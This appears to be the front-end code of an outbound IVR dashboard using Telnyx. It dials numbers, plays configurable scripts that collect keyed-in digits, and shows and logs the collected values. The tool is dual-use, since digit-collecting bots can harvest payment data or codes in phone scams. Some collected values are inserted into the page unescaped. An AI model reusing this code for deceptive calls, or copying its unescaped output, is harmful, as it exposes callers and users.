'<div class="dl">',
'<div class="sl">New Call</div>',
'<div class="fi"><label>Phone Number</label><input type="tel" id="phoneInput" placeholder="+1 555 000 0000"/></div>',
'<div class="fi"><label>Label (optional)</label><input type="text" id="labelInput" placeholder="Invoice #042"/></div>',
'<div class="fi"><label>Script</label><select id="scriptSelect"></select></div>',
'<div class="pad">',
'<button class="key" onclick="dk(\'1\')"><span>1</span><small>&nbsp;</small></button>',
'<button class="key" onclick="dk(\'2\')"><span>2</span><small>ABC</small></button>',
'<button class="key" onclick="dk(\'3\')"><span>3</span><small>DEF</small></button>',
'<button class="key" onclick="dk(\'4\')"><span>4</span><small>GHI</small></button>',
'<button class="key" onclick="dk(\'5\')"><span>5</span><small>JKL</small></button>',
'<button class="key" onclick="dk(\'6\')"><span>6</span><small>MNO</small></button>',
'<button class="key" onclick="dk(\'7\')"><span>7</span><small>PQRS</small></button>',
'<button class="key" onclick="dk(\'8\')"><span>8</span><small>TUV</small></button>',
'<button class="key" onclick="dk(\'9\')"><span>9</span><small>WXYZ</small></button>',
'<button class="key" onclick="dk(\'*\')"><span>*</span><small>&nbsp;</small></button>',
'<button class="key" onclick="dk(\'0\')"><span>0</span><small>+</small></button>',
'<button class="key" onclick="dbk()"><span>&#9003;</span><small>&nbsp;</small></button>',
'</div>',
'<button class="btn-call" id="callBtn" onclick="doCall()"><span id="cIcon">&#128222;</span><span id="cTxt">CALL NOW</span></button>',
'<button class="btn-test" onclick="doTest()">&#128269; Test Connection</button>',
'<div class="msg" id="msg"></div>',
'</div>',
'<div class="stats">',
'<div class="sr">',
'<div class="st"><div class="stn" id="s-act" style="color:var(--cyan)">0</div><div class="stl">Active</div></div>',
'<div class="st"><div class="stn" id="s-tot" style="color:var(--purple)">0</div><div class="stl">Today</div></div>',
'<div class="st"><div class="stn" id="s-don" style="color:var(--green)">0</div><div class="stl">Done</div></div>',
'</div>',
'<div class="pill"><div class="dot"></div>Live · every 2s</div>',
'</div>',
'</aside>',
'<main class="main">',
'<nav class="tabs">',
'<button class="tab active" onclick="goTab(\'monitor\',this)">&#128202; Monitor</button>',
'<button class="tab" onclick="goTab(\'scripts\',this)">&#128203; Scripts</button>',
'<button class="tab" onclick="goTab(\'logs\',this)">&#128193; Logs</button>',
'<button class="tab" onclick="goTab(\'settings\',this)">&#9881;&#65039; Settings</button>',
'</nav>',
/* MONITOR */
'<div id="panel-monitor" class="panel active">',
'<div class="ph"><div><div class="ph-title">Live Call Monitor</div><div class="ph-sub">Updates every 2 seconds</div></div></div>',
'<div id="mgrid" class="mgrid">',
'<div class="empty" id="empty">',
'<svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07A19.5 19.5 0 013.07 11.5a19.79 19.79 0 01-3.07-8.67A2 2 0 012 .84h3a2 2 0 012 1.72c.127.96.361 1.903.7 2.81a2 2 0 01-.45 2.11L6.09 8.14a16 16 0 006.29 6.29l1.42-1.42a2 2 0 012.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0122 16.92z"/></svg>',
'<div class="et">No active calls</div>',
'<div class="es">Enter a number and click CALL NOW</div>',
'</div>',
'</div>',
'</div>',
/* SCRIPTS */
'<div id="panel-scripts" class="panel">',
'<div class="ph"><div><div class="ph-title">Script Builder</div><div class="ph-sub">Templates are locked — use Save as New to create your own</div></div></div>',
'<div id="slib" class="slib"></div>',
'<div class="sname-bar"><input class="sname-inp" id="sname" placeholder="Script name..."/></div>',
'<div class="sec"><div class="sec-t">Opening Greeting</div><div class="g2">',
'<div class="ff full"><label>What the bot says first</label><textarea id="s-gmsg" rows="2"></textarea></div>',
'<div class="ff"><label>Timeout (seconds)</label><input type="number" id="s-gtimeout" value="10" min="5" max="60"/></div>',
'<div class="ff"><label>No-input message</label><input type="text" id="s-gnoinput"/></div>',
'</div></div>',
'<div class="sec"><div class="sec-t">Collection Steps</div><div id="steps-list"></div><button class="btn-add" onclick="addStep()">+ Add Step</button></div>',
'<div class="sec"><div class="sec-t">Completion Messages</div><div class="g2">',
'<div class="ff full"><label>Success — all steps done</label><textarea id="s-success" rows="2"></textarea></div>',
'<div class="ff full"><label>Cancel — caller pressed 2</label><textarea id="s-cancel" rows="2"></textarea></div>',
'<div class="ff full"><label>Timeout — no input</label><textarea id="s-error" rows="2"></textarea></div>',
'</div></div>',
'<div class="save-row">',
'<button class="btn-save" onclick="saveScript()">Save Script</button>',
'<button class="btn-save s2" onclick="saveAsNew()">+ Save as New</button>',
'<span class="ok" id="sc-ok">Saved!</span>',
'</div>',
'</div>',
/* LOGS */
'<div id="panel-logs" class="panel">',
'<div class="ph">',
'<div><div class="ph-title">Call Logs</div><div class="ph-sub">Full history with collected data</div></div>',
'<button class="btn-danger" onclick="clearLogs()">Clear All</button>',
'</div>',
'<div id="logs-con"></div>',
'</div>',
/* SETTINGS */
'<div id="panel-settings" class="panel">',
'<div class="ph"><div><div class="ph-title">Settings</div><div class="ph-sub">Telnyx credentials</div></div></div>',
'<div class="hbox">',
'<strong>Setup steps:</strong><br>',
'1. Get API Key from <a href="https://portal.telnyx.com/#/app/api-keys" target="_blank">portal.telnyx.com</a> &#8594; API Keys<br>',
'2. Buy a number at <strong>Numbers &#8594; Buy Numbers</strong><br>',
'3. Create a <strong>TeXML App</strong> at Voice &#8594; TeXML Apps &#8594; set webhook URL to your Render URL + <code>/twiml/start</code><br>',
'4. Copy the <strong>Connection ID</strong> from that TeXML App',
'</div>',
'<div class="sec"><div class="sec-t">Credentials</div><div class="g2">',
'<div class="ff full"><label>Company Name</label><input type="text" id="cfg-co" placeholder="My Company"/></div>',
'<div class="ff full"><label>API Key</label><input type="password" id="cfg-key" placeholder="KEY..."/><span class="note">From portal.telnyx.com &#8594; API Keys</span></div>',
'<div class="ff"><label>Connection ID</label><input type="text" id="cfg-cid" placeholder="1234567890"/><span class="note">From Voice &#8594; TeXML Apps &#8594; your app</span></div>',
'<div class="ff"><label>Phone Number (From)</label><input type="tel" id="cfg-from" placeholder="+15551234567"/></div>',
'<div class="ff full"><label>Server URL (your Render URL)</label><div class="url-row"><input type="text" id="cfg-url" placeholder="https://your-app.onrender.com"/><button class="btn-auto" onclick="document.getElementById(\'cfg-url\').value=window.location.origin">Auto</button></div><span class="note">Also paste this into your TeXML App webhook field</span></div>',
'</div></div>',
'<div class="sec"><div class="sec-t">Voice</div><div class="vg" id="vg"></div></div>',
'<div class="save-row"><button class="btn-save" onclick="saveSettings()">Save Settings</button><span class="ok" id="st-ok">Saved!</span></div>',
'</div>',
'</main>',
'</div>',
'<script>',
'var settings={},scripts=[],sessions=[],logs=[],editId=null,editSteps=[];',
'var SEED_IDS=["s-default","s-payment","s-survey"];',
'var VOICES=[',
'  {id:"alice",name:"Alice",desc:"Classic female"},',
'  {id:"man",name:"Man",desc:"Classic male"},',
'  {id:"Polly.Joanna",name:"Joanna",desc:"US female"},',
'  {id:"Polly.Matthew",name:"Matthew",desc:"US male"},',
'  {id:"Polly.Amy",name:"Amy",desc:"UK female"},',
'  {id:"Polly.Brian",name:"Brian",desc:"UK male"}',
'];',
'',
'function goTab(id,btn){',
'  document.querySelectorAll(".panel").forEach(function(p){p.classList.remove("active");});',
'  document.querySelectorAll(".tab").forEach(function(t){t.classList.remove("active");});',
'  document.getElementById("panel-"+id).classList.add("active");',
'  btn.classList.add("active");',
'  if(id==="logs")loadLogsUI();',
'}',
'',
'function dk(k){var i=document.getElementById("phoneInput");i.value=(i.value||"")+k;}',
'function dbk(){var i=document.getElementById("phoneInput");i.value=i.value.slice(0,-1);}',
'',
'/* Settings */',
'function loadSettingsUI(){',
'  fetch("/api/settings").then(function(r){return r.json();}).then(function(s){',
'    settings=s;',
'    document.getElementById("cfg-co").value=s.companyName||"";',
'    document.getElementById("cfg-key").value=s.apiKey||"";',
'    document.getElementById("cfg-cid").value=s.connectionId||"";',
'    document.getElementById("cfg-from").value=s.fromNumber||"";',
'    document.getElementById("cfg-url").value=s.baseUrl||"";',
'    document.getElementById("co-name").textContent=s.companyName||"IVR PRO";',
'    renderVoices(s.voice||"alice");',
'  });',
'}',
'function saveSettings(){',
'  var p={',
'    companyName:document.getElementById("cfg-co").value,',
'    apiKey:document.getElementById("cfg-key").value,',
'    connectionId:document.getElementById("cfg-cid").value,',
'    fromNumber:document.getElementById("cfg-from").value,',
'    baseUrl:document.getElementById("cfg-url").value,',
'    voice:(document.querySelector("input[name=voice]:checked")||{value:"alice"}).value',
'  };',
'  fetch("/api/settings",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(p)})',
'    .then(function(){document.getElementById("co-name").textContent=p.companyName||"IVR PRO";showOk("st-ok");});',
'}',
'function renderVoices(sel){',
'  document.getElementById("vg").innerHTML=VOICES.map(function(v){',
'    return "<label class=\\"vo\\"><input type=\\"radio\\" name=\\"voice\\" value=\\""+v.id+"\\" "+(v.id===sel?"checked":"")+"><div class=\\"vo-n\\">"+v.name+"</div><div class=\\"vo-d\\">"+v.desc+"</div></label>";',
'  }).join("");',
'}',
'',
'/* Scripts */',
'function loadScriptsUI(){',
'  fetch("/api/scripts").then(function(r){return r.json();}).then(function(s){',
'    scripts=s;',
'    renderSLib();renderSSelect();',
'    var def=scripts.find(function(x){return x.isDefault;})||scripts[0];',
'    if(def)loadEditor(def);',
'  });',
'}',
'function renderSLib(){',
'  var h=scripts.map(function(s){',
'    var seed=SEED_IDS.indexOf(s.id)>=0;',
'    var del=seed?"":"<button class=\\"btn-sc del\\" onclick=\\"event.stopPropagation();delScript(\'"+s.id+"\')\\" >Del</button>";',
'    return "<div class=\\"sc"+(s.id===editId?" sel":"")+(s.isDefault?" isdef":"")+"\\""+" onclick=\\"loadEditorById(\'"+s.id+"\')\\">" +',
'      "<div class=\\"sc-name\\">"+esc(s.name)+(seed?"<span class=\\"sc-tag\\">TPL</span>":"")+"</div>"+',
'      "<div class=\\"sc-meta\\">"+(s.steps||[]).length+" steps &middot; "+(s.isDefault?"<b style=\\"color:var(--cyan2)\\">Default</b>":"inactive")+"</div>"+',
'      "<div class=\\"sc-btns\\"><button class=\\"btn-sc def\\" onclick=\\"event.stopPropagation();setDefault(\'"+s.id+"\')\\">"+(s.isDefault?"&#10003; Default":"Set Default")+"</button>"+del+"</div>"+',
'      "</div>";',
'  }).join("");',
'  h+="<div class=\\"sc sc-new\\" onclick=\\"newScript()\\"><div style=\\"font-size:22px;opacity:.4\\">&#65291;</div><div style=\\"font-size:11px;font-weight:600;margin-top:4px\\">New Script</div></div>";',
'  document.getElementById("slib").innerHTML=h;',
'}',
'function renderSSelect(){',
'  document.getElementById("scriptSelect").innerHTML=scripts.map(function(s){',
'    return "<option value=\\""+s.id+"\\">"+esc(s.name)+(s.isDefault?" \u2605":"")+"</option>";',
'  }).join("");',
'  var def=scripts.find(function(x){return x.isDefault;});',
'  if(def)document.getElementById("scriptSelect").value=def.id;',
'}',
'function loadEditorById(id){var s=scripts.find(function(x){return x.id===id;});if(s)loadEditor(s);}',
'function loadEditor(s){',
'  editId=s.id;',
'  document.getElementById("sname").value=s.name||"";',
'  document.getElementById("s-gmsg").value=(s.greeting&&s.greeting.message)||"";',
'  document.getElementById("s-gtimeout").value=(s.greeting&&s.greeting.timeout)||10;',
'  document.getElementById("s-gnoinput").value=(s.greeting&&s.greeting.noInputMessage)||"";',
'  document.getElementById("s-success").value=s.successMessage||"";',
'  document.getElementById("s-cancel").value=s.cancelMessage||"";',
'  document.getElementById("s-error").value=s.errorMessage||"";',
'  editSteps=s.steps?JSON.parse(JSON.stringify(s.steps)):[];',
'  renderSteps();renderSLib();',
'}',
'function newScript(){',
'  editId=null;',
'  document.getElementById("sname").value="New Script";',
'  document.getElementById("s-gmsg").value="Hello! Press 1 to continue or press 2 to end.";',
'  document.getElementById("s-gtimeout").value=10;',
'  document.getElementById("s-gnoinput").value="We did not receive your input. Goodbye.";',
'  document.getElementById("s-success").value="Thank you. Goodbye.";',
'  document.getElementById("s-cancel").value="No problem. Goodbye.";',
'  document.getElementById("s-error").value="We did not receive your input. Goodbye.";',
'  editSteps=[{label:"Step 1",message:"",maxDigits:5,timeout:15,confirmMessage:"Thank you. "}];',
'  renderSteps();',
'}',
'function buildPayload(){',
'  var cards=document.querySelectorAll(".step-c");',
'  var steps=Array.from(cards).map(function(c,i){',
'    return{label:c.querySelector(".step-name").value||("Step "+(i+1)),message:c.querySelector(".step-msg").value,maxDigits:parseInt(c.querySelector(".step-digits").value)||5,timeout:parseInt(c.querySelector(".step-timeout").value)||15,confirmMessage:c.querySelector(".step-confirm").value};',
'  });',
'  return{name:document.getElementById("sname").value||"Unnamed",greeting:{message:document.getElementById("s-gmsg").value,timeout:parseInt(document.getElementById("s-gtimeout").value)||10,noInputMessage:document.getElementById("s-gnoinput").value},steps:steps,successMessage:document.getElementById("s-success").value,cancelMessage:document.getElementById("s-cancel").value,errorMessage:document.getElementById("s-error").value};',
'}',
'function saveScript(){',
'  var d=buildPayload();d.id=editId;',
'  fetch("/api/scripts",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(d)})',
'    .then(function(r){return r.json();}).then(function(res){scripts=res.scripts;renderSLib();renderSSelect();showOk("sc-ok");});',
'}',
'function saveAsNew(){',
'  var d=buildPayload();d.id=null;',
'  fetch("/api/scripts",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(d)})',
'    .then(function(r){return r.json();}).then(function(res){scripts=res.scripts;editId=scripts[scripts.length-1].id;renderSLib();renderSSelect();showOk("sc-ok");});',
'}',
'function setDefault(id){',
'  fetch("/api/scripts/"+id+"/setdefault",{method:"POST"}).then(function(){return fetch("/api/scripts");}).then(function(r){return r.json();}).then(function(s){scripts=s;renderSLib();renderSSelect();});',
'}',
'function delScript(id){',
'  if(!confirm("Delete this script?"))return;',
'  fetch("/api/scripts/"+id,{method:"DELETE"}).then(function(r){return r.json();}).then(function(res){scripts=res.scripts;if(editId===id)loadEditor(scripts.find(function(x){return x.isDefault;})||scripts[0]);renderSLib();renderSSelect();});',
'}',
'function renderSteps(){',
'  document.getElementById("steps-list").innerHTML=editSteps.map(function(s,i){',
'    return "<div class=\\"step-c\\"><div class=\\"step-hd\\"><div class=\\"step-n\\">"+(i+1)+"</div><input class=\\"step-name\\" value=\\""+esc(s.label)+"\\" placeholder=\\"Step name\\"/><button class=\\"btn-rm\\" onclick=\\"rmStep("+i+")\\">&times;</button></div>"+',
'      "<div class=\\"sg\\"><div class=\\"sf full\\"><label>What the bot says</label><textarea class=\\"step-msg\\" rows=\\"2\\" placeholder=\\"Please enter...\\">"+esc(s.message)+"</textarea></div>"+',
'      "<div class=\\"sf\\"><label>Max digits</label><input type=\\"number\\" class=\\"step-digits\\" value=\\""+(s.maxDigits||5)+"\\" min=\\"1\\" max=\\"20\\"/></div>"+',
'      "<div class=\\"sf\\"><label>Timeout (s)</label><input type=\\"number\\" class=\\"step-timeout\\" value=\\""+(s.timeout||15)+"\\" min=\\"5\\" max=\\"60\\"/></div>"+',
'      "<div class=\\"sf full\\"><label>Confirmation after input</label><input type=\\"text\\" class=\\"step-confirm\\" value=\\""+esc(s.confirmMessage||"")+"\\" /></div>"+',
'      "</div></div>";',
'  }).join("");',
'}',
'function addStep(){editSteps.push({label:"Step "+(editSteps.length+1),message:"",maxDigits:5,timeout:15,confirmMessage:"Thank you. "});renderSteps();}',
'function rmStep(i){if(editSteps.length<=1){alert("Need at least 1 step.");return;}editSteps.splice(i,1);renderSteps();}',
'',
'/* Call */',
'function doCall(){',
'  var phone=document.getElementById("phoneInput").value.trim();',
'  var label=document.getElementById("labelInput").value.trim();',
'  var sid=document.getElementById("scriptSelect").value;',
'  if(!phone){showMsg("Please enter a phone number.","err");return;}',
'  var btn=document.getElementById("callBtn");',
'  btn.disabled=true;',
'  document.getElementById("cTxt").textContent="CALLING...";',
'  document.getElementById("cIcon").textContent="\u23f3";',
'  hideMsg();',
'  fetch("/api/call",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phoneNumber:phone,label:label||"Call",scriptId:sid})})',
'    .then(function(r){return r.json();})',
'    .then(function(d){',
'      if(d.success){showMsg("\u2705 Call started!","ok");document.getElementById("phoneInput").value="";document.getElementById("labelInput").value="";setTimeout(function(){hideMsg();},4000);}',
'      else{showMsg("\u274c "+(d.error||"Error"),"err");}',
'      btn.disabled=false;document.getElementById("cTxt").textContent="CALL NOW";document.getElementById("cIcon").textContent="\ud83d\udcf2";',
'    })',
'    .catch(function(){showMsg("\u274c Cannot connect.","err");btn.disabled=false;document.getElementById("cTxt").textContent="CALL NOW";document.getElementById("cIcon").textContent="\ud83d\udcf2";});',
'}',
'function endCall(sid){fetch("/api/call/"+sid+"/end",{method:"POST"}).then(function(r){return r.json();}).then(function(d){if(!d.success)alert("Error: "+d.error);});}',
'function doTest(){',
'  showMsg("\u23f3 Testing...","info");',
'  fetch("/api/test").then(function(r){return r.json();}).then(function(d){if(d.ok)showMsg("\u2705 "+d.message,"ok");else showMsg("\u274c "+d.error,"err");}).catch(function(){showMsg("\u274c Cannot reach server.","err");});',
'}',
'function showMsg(t,c){var e=document.getElementById("msg");e.textContent=t;e.className="msg "+c;e.style.display="block";}',
'function hideMsg(){var e=document.getElementById("msg");e.style.display="none";e.className="msg";}',
'document.getElementById("phoneInput").addEventListener("keypress",function(e){if(e.key==="Enter")doCall();});',
'',
'/* Monitor */',
'function poll(){',
'  fetch("/api/sessions").then(function(r){return r.json();}).then(function(s){',
'    sessions=s;renderMon();',
'    document.getElementById("s-act").textContent=s.filter(function(x){return["in-progress","initiated","ringing"].includes(x.status);}).length;',
'    document.getElementById("s-tot").textContent=s.length;',
'    document.getElementById("s-don").textContent=s.filter(function(x){return x.status==="completed";}).length;',
'  }).catch(function(){});',
'}',
'function renderMon(){',
'  var g=document.getElementById("mgrid"),em=document.getElementById("empty");',
'  if(!sessions.length){em.style.display="flex";return;}em.style.display="none";',
'  sessions.forEach(function(s){',
'    var id="mc-"+s.callSid,card=document.getElementById(id);',
'    if(!card){card=document.createElement("div");card.id=id;g.insertBefore(card,g.firstChild);}',
'    var act=["in-progress","initiated","ringing"].includes(s.status);',
'    var badge="<span class=\\"badge badge-"+s.status+"\\"><span class=\\"bd"+(act?" bdp":"")+"\\">&nbsp;</span>"+s.status.replace(/-/g," ").toUpperCase()+"</span>";',
'    var prog="";',
'    if(s.steps>0){prog="<div class=\\"prog\\">";for(var i=0;i<s.steps;i++){var cl=i<s.collected.length?"done":(i===s.collected.length&&act?"act":"");prog+="<div class=\\"ps "+cl+"\\"></div>";}prog+="</div>";}',
'    var coll="";',
'    if(s.collected.length){coll="<div class=\\"clist\\">";s.collected.forEach(function(c){coll+="<div class=\\"ci\\"><span class=\\"cil\\">"+c.label+"</span><span class=\\"civ\\">"+c.value+"</span><span class=\\"cit\\">"+new Date(c.time).toLocaleTimeString()+"</span></div>";});coll+="</div>";}',
'    var dur=s.duration?(Math.floor(s.duration/60)+"m "+(s.duration%60)+"s"):(act?"<span style=\\"color:var(--cyan2)\\">&#9679; Live</span>":"&mdash;");',
'    var endBtn=act?"<button class=\\"btn-sm end\\" onclick=\\"endCall(\'"+s.callSid+"\')\\">&FilledSmallSquare; End</button>":"";',
'    var cpBtn=s.collected.length?"<button class=\\"btn-sm\\" onclick=\\"cpData(\'"+s.callSid+"\')\\">&FilledRectangle; Copy</button>":"";',
'    var sline=s.statusDetail?"<div class=\\"sl2\\"><span class=\\"sdot"+(act?" a":" ")+"\\">&nbsp;</span>"+s.statusDetail+"</div>":"";',
'    card.className="ccard s-"+s.status.replace(/[^a-z-]/g,"");',
'    card.innerHTML="<div class=\\"ch\\"><div><div class=\\"cph\\">"+s.phone+"</div><div class=\\"clb\\">"+s.label+" &middot; "+(s.scriptName||"")+"</div></div><div class=\\"cr\\"><div class=\\"ct\\">"+new Date(s.startTime).toLocaleTimeString()+"</div>"+badge+"</div></div>"+',
'      "<div class=\\"cb\\">"+prog+coll+sline+"</div>"+',
'      "<div class=\\"cf\\"><div class=\\"cft\\">"+dur+"</div><div class=\\"cfb\\">"+endBtn+cpBtn+"</div></div>";',
'  });',
'}',
'function cpData(sid){var s=sessions.find(function(x){return x.callSid===sid;});if(!s)return;var l=["Phone: "+s.phone,"Label: "+s.label,"Time: "+new Date(s.startTime).toLocaleString(),""];s.collected.forEach(function(c){l.push(c.label+": "+c.value);});navigator.clipboard.writeText(l.join("\\n"));}',
'',
'/* Logs */',
'function loadLogsUI(){fetch("/api/logs").then(function(r){return r.json();}).then(function(l){logs=l;renderLogs();});}',
'function renderLogs(){',
'  var c=document.getElementById("logs-con");',
'  if(!logs.length){c.innerHTML="<div class=\\"no-d\\">No call logs yet</div>";return;}',
'  var rows=logs.map(function(l){',
'    var dur=l.duration?(Math.floor(l.duration/60)+"m "+(l.duration%60)+"s"):"&mdash;";',
'    var t=new Date(l.startTime).toLocaleString();',
'    var has=l.collected&&l.collected.length>0;',
'    var det="";',
'    if(has){var chips=l.collected.map(function(c){return"<div class=\\"chip\\"><div class=\\"chip-l\\">"+c.label+"</div><div class=\\"chip-v\\">"+c.value+"</div></div>";}).join("");det="<tr class=\\"det-row\\" id=\\"dr-"+l.id+"\\"><td colspan=\\"7\\" class=\\"det-cell\\"><div class=\\"chips\\">"+chips+"</div></td></tr>";}',
'    return "<tr>"+',
'      "<td style=\\"font-family:var(--mono);font-weight:700\\">"+l.phone+"</td>"+',
'      "<td>"+l.label+"</td>"+',
'      "<td style=\\"color:var(--text2);font-size:11px\\">"+(l.scriptName||"&mdash;")+"</td>"+',
'      "<td><span class=\\"badge badge-"+l.status+"\\" style=\\"font-size:9px\\">"+l.status.replace(/-/g," ").toUpperCase()+"</span></td>"+',
'      "<td class=\\"dur\\">"+dur+"</td>"+',
'      "<td style=\\"color:var(--text2);font-size:11px\\">"+t+"</td>"+',
'      "<td>"+(has?"<button class=\\"det-btn\\" onclick=\\"tog(\'"+l.id+"\')\\" >View</button>":"&mdash;")+"</td>"+',
'      "<td><button class=\\"btn-sm\\" style=\\"color:var(--red);border-color:rgba(239,68,68,.3)\\" onclick=\\"delLog(\'"+l.id+"\')\\" >&#128465;</button></td>"+',
'      "</tr>"+det;',
'  }).join("");',
'  c.innerHTML="<div class=\\"lw\\"><table class=\\"lt\\"><thead><tr><th>Phone</th><th>Label</th><th>Script</th><th>Status</th><th>Duration</th><th>Time</th><th>Data</th><th></th></tr></thead><tbody>"+rows+"</tbody></table></div>";',
'}',
'function tog(id){var e=document.getElementById("dr-"+id);if(e)e.classList.toggle("on");}',
'function delLog(id){fetch("/api/logs/"+id,{method:"DELETE"}).then(function(){logs=logs.filter(function(l){return l.id!==id;});renderLogs();});}',
'function clearLogs(){if(!confirm("Clear all logs?"))return;fetch("/api/logs",{method:"DELETE"}).then(function(){logs=[];renderLogs();});}',
'',
'/* Utils */',
'function esc(s){return(s||"").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");}',
'function showOk(id){var e=document.getElementById(id);e.classList.add("on");setTimeout(function(){e.classList.remove("on");},2500);}',
'',
'/* Init */',
'loadSettingsUI();',
'loadScriptsUI();',
'poll();',
'setInterval(poll,2000);',
'</script>',
'</body>',
'</html>'
].join("\n");
